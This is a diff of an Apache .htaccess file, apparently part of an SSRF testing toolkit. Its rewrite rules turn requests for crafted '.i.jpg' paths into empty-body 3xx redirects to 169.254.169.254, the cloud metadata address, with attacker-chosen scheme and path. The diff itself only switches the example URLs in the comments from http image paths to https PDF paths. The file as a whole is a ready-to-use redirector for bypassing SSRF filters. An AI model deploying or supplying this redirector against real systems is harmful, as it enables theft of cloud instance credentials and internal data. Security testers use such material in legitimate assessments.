@@ -8,50 +8,50 @@ ErrorDocument 307 " "
 ErrorDocument 308 " "
 
 # 300 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/300-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/300-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/300-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/300-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 300-([^/-]*)-(.*).i.jpg$
 RewriteRule 300-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=300,NC]
 
 # 301 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/301-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/301-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 301-([^/-]*)-(.*).i.jpg$
 RewriteRule 301-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=301,NC]
 
 # 302 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/302-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/302-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/302-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/302-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 302-([^/-]*)-(.*).i.jpg$
 RewriteRule 302-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=302,NC]
 
 # 303 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/303-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/303-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/303-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/303-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-(.*).i.jpg$
 RewriteRule 303-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=303,NC]
 
 # 305 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/305-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/305-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/305-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/305-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 305-([^/-]*)-(.*).i.jpg$
 RewriteRule 305-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=305,NC]
 
 # 307 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/307-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/307-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/307-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/307-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 307-([^/-]*)-(.*).i.jpg$
 RewriteRule 307-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=307,NC]
 
 # 308 without response body
-# http://ssrf.localdomain.pw/img-without-body-md/308-http-.i.jpg
-# http://ssrf.localdomain.pw/img-without-body-md/308-http-test/.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/308-http-.i.jpg
+# https://ssrf.localdomain.pw/pdf-without-body-md/308-http-test/.i.jpg
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 308-([^/-]*)-(.*).i.jpg$
 RewriteRule 308-([^/-]*)-(.*).i.jpg$ $1://169.254.169.254/$2 [L,R=308,NC]
